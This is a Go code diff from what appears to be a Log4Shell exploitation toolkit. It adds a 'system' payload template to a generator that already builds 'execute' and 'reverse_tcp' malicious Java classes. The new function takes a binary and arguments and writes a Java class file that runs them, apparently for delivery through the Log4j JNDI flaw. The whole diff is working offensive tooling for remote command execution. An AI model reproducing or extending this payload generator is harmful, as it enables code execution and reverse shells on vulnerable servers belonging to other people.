@@ -140,10 +140,12 @@ func generateClass() {
 	switch genClass {
 	case "execute":
 		generateExecute()
+	case "system":
+		generateSystem()
 	case "reverse_tcp":
 		generateReverseTCP()
 	default:
-		fmt.Println("supported Java class template: execute, reverse_tcp")
+		fmt.Println("supported Java class template: execute, system, reverse_tcp")
 		fmt.Println()
 		log.Fatalf("[error] unknown Java class template name: \"%s\"\n", genClass)
 	}
@@ -172,6 +174,37 @@ func generateExecute() {
 	}
 
 	data, err := log4shell.GenerateExecute(template, command, gnClass)
+	checkError(err)
+	err = os.WriteFile(genOut, data, 0600)
+	checkError(err)
+}
+
+func generateSystem() {
+	template, err := os.ReadFile("template/System.class")
+	checkError(err)
+
+	args := flag.NewFlagSet("System", flag.ExitOnError)
+	args.SetOutput(os.Stdout)
+	var (
+		binary    string
+		arguments string
+	)
+	args.StringVar(&binary, "bin", "", "the executed binary")
+	args.StringVar(&arguments, "args", "", "the executed arguments")
+	_ = args.Parse(log4shell.CommandLineToArgs(genArgs))
+
+	if binary == "" {
+		args.PrintDefaults()
+		os.Exit(2)
+	}
+	if gnClass == "" {
+		gnClass = "System"
+	}
+	if genOut == "" {
+		genOut = filepath.Join(config.PayloadDir, gnClass+".class")
+	}
+
+	data, err := log4shell.GenerateSystem(template, binary, arguments, gnClass)
 	checkError(err)
 	err = os.WriteFile(genOut, data, 0600)
 	checkError(err)
